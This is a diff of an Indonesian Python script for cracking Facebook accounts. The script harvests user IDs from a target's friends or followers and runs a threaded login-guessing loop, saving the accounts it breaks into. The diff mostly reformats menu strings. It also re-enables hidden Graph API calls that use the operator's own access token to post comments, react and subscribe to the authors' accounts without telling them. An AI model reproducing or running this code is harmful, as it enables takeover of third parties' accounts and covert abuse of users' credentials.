@@ -28,12 +28,12 @@ ua = ('BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/10
 ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30')
 # Cek hasil okeh
 def __hasil_ok_cp__():
-	raka("\n \033[0;37m[\033[0;36m1\033[0;36m]\033[0;00m Lihat hasil ok")
-	raka(" \033[0;37m[\033[0;36m2\033[0;36m]\033[0;00m Lihat hasil cp")
-	raka(" \033[0;37m[\033[0;36m3\033[0;36m]\033[0;00m Exit")
+	raka("\n\033[0;37m[\033[0;36m1\033[0;36m]\033[0;00m Lihat hasil ok")
+	raka("\033[0;37m[\033[0;36m2\033[0;36m]\033[0;00m Lihat hasil cp")
+	raka("\033[0;37m[\033[0;36m3\033[0;36m]\033[0;00m Exit")
 	has = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : \033[0;36m")
 	if has == '':
-		exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
+		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
 	elif has == '1':
 		hasil_ok = open('Ok.json','r').read()
 		print(hasil_ok)
@@ -45,7 +45,7 @@ def __hasil_ok_cp__():
 	elif has == '3':
 		__menu__()
 	else:
-		exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
+		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
 # Jangan Di Ganti # Kalo Mau Tambahin Aja #
 
 komenredem = random.choice(['Bang Lu krend bang!', 'Bang Lu Cakep Tapi Sayang pacarnya cuma satu ?', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
@@ -68,30 +68,30 @@ def __sayang_amanda__():
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' + yotsuba + '&access_token=' + token)
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' + komentar + '&access_token=' + token)
-#    requests.post('https://graph.facebook.com/' + post1 + '/reactions?type=LOVE&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post1 + '/reactions?type=LOVE&access_token=' + token)
     requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + kom + '&access_token=' + token)
- #   requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + yotsuba + '&access_token=' + token)
-#    requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + komentar + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + yotsuba + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + komentar + '&access_token=' + token)
     requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token=' + token)
- #   requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=likes&access_token=' + token)
-#    requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)#kon zaim
- #   requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token) #mey
-#  #  requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token)#mieruko chan
- #   requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token) #tsukasa chan
+    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=likes&access_token=' + token)
+    requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token)
     __menu__()
 
 
 def __raka_sayang_amanda__():
 	os.system('clear')
 	print(_raka_banner_)
-	raka("\n \033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Login Menggunakan Token Facebook")
-	raka(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Cara Mengambil Token Facebook")
-	raka(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Exit")
+	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Login Menggunakan Token Facebook")
+	raka("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Cara Mengambil Token Facebook")
+	raka("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Exit")
         masuk = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : \033[0;36m")
         if masuk == "":
-                exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk Input")
+                exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk Input")
         elif masuk == "1":
-		token = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token : \033[0;36m")
+		token = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token : \033[0;36m")
 		try:
                 	y = requests.get('https://graph.facebook.com/me?access_token='+token)
 	                x = json.loads(y.text)
@@ -101,20 +101,20 @@ def __raka_sayang_amanda__():
 	                save.close()
 	                __sayang_amanda__()
 	        except KeyError:
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token invallid")
+			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token invallid")
 	                time.sleep(3)
 	                __raka_sayang_amanda__()
 	        except requests.exceptions.SSLError:
-	                exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token Invallid")
+	                exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token Invallid")
         elif masuk == "2":
-		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Anda akan diarahkan ke youtube")
+		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Anda akan diarahkan ke youtube")
                 time.sleep(3)
 		os.system("xdg-open https://youtu.be/bszAm4C5ovE")
                 exit()
         elif masuk == "0":
                 exit()
         else:
-		exit(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
+		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input")
 _raka_banner_ = ("""
 \033[0;31m       $$$$$$$$\ $$\                             $$$$$$$\  
 \033[0;31m      $$  _____|$$ |                            $$  __$$\ 
@@ -128,9 +128,9 @@ _raka_banner_ = ("""
 \033[0;35m            \$$$$$$  |                            
 \033[0;35m            \______/                             
 \033[0;36m_______________________________________________________\n
-\033[0;37m⋆✥⋆➣Desigen By : \033[0;36mRaka Andrian Tara
-\033[0;37m⋆✥⋆➣Github     : \033[0;36mBajingan-Z
-\033[0;37m⋆✥⋆➣Coded By   : \033[0;36mRaka \033[0;37m& \033[0;36mAngga\033[0;37m
+\033[0;32m⋆✥⋆➣\033[0;37mDesigen By : \033[0;36mRaka Andrian Tara
+\033[0;32m⋆✥⋆➣\033[0;37mGithub     : \033[0;36mBajingan-Z
+\033[0;32m⋆✥⋆➣\033[0;37mCoded By   : \033[0;36mRaka \033[0;37m& \033[0;36mAngga\033[0;37m
 \033[0;36m_______________________________________________________        """)
 
 # Oi memex ini menu yah
@@ -138,7 +138,7 @@ def __menu__():
         try:
                 token = open('login.txt','r').read()
         except IOError:
-		raka(" \033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
+		raka("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token invallid")
                 os.system('rm -rf login.txt')
 		time.sleep(2)
                 __raka_sayang_amanda__()
@@ -148,46 +148,46 @@ def __menu__():
                 name = q['name']
 		birthday = q['birthday']
         except KeyError:
-		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token invallid")
+		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Token invallid")
                 os.system('rm -rf login.txt')
 		time.sleep(3)
 		__raka_sayang_amanda__()
         except requests.exceptions.ConnectionError:
-		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tidak ada koneksi internet");exit
+		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tidak ada koneksi internet");exit
         os.system('clear')
 	print(_raka_banner_)
-	print("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama Account  : \033[0;36m" +name)
-	print(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
-	raka("\n \033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Crack Id Dari Publik")
-	print(" \033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Crack Id Dari Followers")
-	print(" \033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Chek Results Crack")
-	raka(" \033[0;37m[\033[0;36m0\033[0;37m]\033[0;00m Remove Token")
+	print("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama Account  : \033[0;36m" +name)
+	print("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Tanggal Lahir : \033[0;36m"+birthday)
+	raka("\n\033[0;37m[\033[0;36m1\033[0;37m]\033[0;00m Crack Id Dari Publik")
+	print("\033[0;37m[\033[0;36m2\033[0;37m]\033[0;00m Crack Id Dari Followers")
+	print("\033[0;37m[\033[0;36m3\033[0;37m]\033[0;00m Chek Results Crack")
+	raka("\033[0;37m[\033[0;36m0\033[0;37m]\033[0;00m Remove Token")
 	_naruto_kurama_ = raw_input("\n \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Input : \033[0;36m")
 	if _naruto_kurama_ == "":
-		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input ");exit
+		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input ");exit
 	elif _naruto_kurama_ == "1" or _naruto_kurama_ == "01":
-		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : \033[0;36m")
+		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : \033[0;36m"+sp["name"])
+			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak ditemukan");exit
+			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak ditemukan");exit
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		z = json.loads(r.text)
 		for i in z["data"]:
 			uid = i['id']
 			id.append(uid)
 	elif _naruto_kurama_ == "2" or _naruto_kurama_ == "02":
-		idt = raw_input(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : \033[0;36m")
+		idt = raw_input("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target : \033[0;36m")
 		try:
 			token=open('login.txt','r').read()
 			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			sp = json.loads(pok.text)
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : \033[0;36m"+sp["name"])
+			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Nama : \033[0;36m"+sp["name"])
 		except KeyError:
-			raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak di temukan");exit
+			raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Target tidak di temukan");exit
 		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
 		z = json.loads(r.text)
 		for i in z["data"]:
@@ -198,10 +198,10 @@ def __menu__():
 	elif _naruto_kurama_ == "0" or _naruto_kurama_ == "00":
 		os.system("rm -f login.txt")
 		time.sleep(3)
-		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Terimakasih telah terhubung di tools saya");exit
+		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Terimakasih telah terhubung di tools saya");exit
 	else:
-		raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input");exit
-	raka(" \033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Total id : \033[0;36m"+str(len(id)))
+		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Wronk input");exit
+	raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Total id : \033[0;36m"+str(len(id)))
 	raka("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Jika Tak Ada Hasil Mainkan Mode Pesawat \033[0;36m1 \033[0;37mDetik ..!")
 	print(' ')
 	def main(arg):
@@ -260,7 +260,7 @@ def __menu__():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
-	raka(" \n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Cracking Finised ");exit
+	raka("\n\033[0;37m[\033[0;36m+\033[0;37m]\033[0;00m Cracking Finised ");exit
 
 if __name__=='__main__':
 	os.system('git pull')
